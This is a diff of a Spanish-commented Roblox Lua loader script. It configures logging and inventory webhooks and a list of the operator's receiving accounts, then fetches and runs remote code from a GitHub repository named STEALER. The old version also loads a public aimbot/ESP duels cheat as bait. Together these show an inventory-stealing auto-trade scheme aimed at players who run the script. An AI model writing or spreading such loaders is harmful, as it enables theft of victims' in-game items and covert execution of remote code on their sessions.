@@ -1,44 +1,23 @@
 -- ==========================================
--- CONFIGURACIÓN PERSONALIZABLE
+-- ⚙️ CONFIGURACIÓN DEL USUARIO (EDITA AQUÍ)
 -- ==========================================
 getgenv().AutoTradeConfig = {
-    WebhookLogs = "TU_WEBHOOK_LOGS_AQUI",
-    WebhookInventario = "TU_WEBHOOK_INVENTARIO_AQUI",
+    -- Pon aquí el link de tu Webhook para ver cuando alguien ejecuta el script
+    WebhookLogs = "TU_WEBHOOK_DE_LOGS_AQUI",
     
-
--- cambia jugador 1,2,3.... por el user de tus cuentas que van a recibir las cosas.  
+    -- Pon aquí el link de tu Webhook para ver lo que recibes
+    WebhookInventario = "TU_WEBHOOK_DE_INVENTARIO_AQUI",
+    
+    -- Pon aquí los nombres de tus cuentas a las que irán los items
     JugadoresObjetivos = {
-        "jugador1", 
-        "Jugador2",
-        "Jugador3"
+        "TuCuentaPrincipal1", 
+        "TuCuentaSecundaria2"
     }
 }
 
--- ==========================================
--- ESPERAR A QUE ROBLOX TERMINE DE CARGAR
--- ==========================================
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
-
-task.wait(2)
+print("Configuración cargada. Iniciando sistema...")
 
 -- ==========================================
--- SCRIPT DE DUELOS (PVP)
+-- 🚀 CARGA DEL SISTEMA (NO TOCAR)
 -- ==========================================
--- Pega tu script de duelos que gustes aquí debajo (PUEDES ENCONTRARLOS EN scriptblox.com)
-task.spawn(function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/DUELS-Murderers-VS-Sheriffs-BEST-SCRIPT-SILENT-AIM-AIMBOT-ESP-RAGEBOT-AND-ALOT-MORE-227237"))()
-end)
-
-
-task.wait(5) 
-
-
--- ==========================================
--- CARGA DEL script de robo NO BORRES ESTO 
--- ==========================================
-
-task.spawn(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
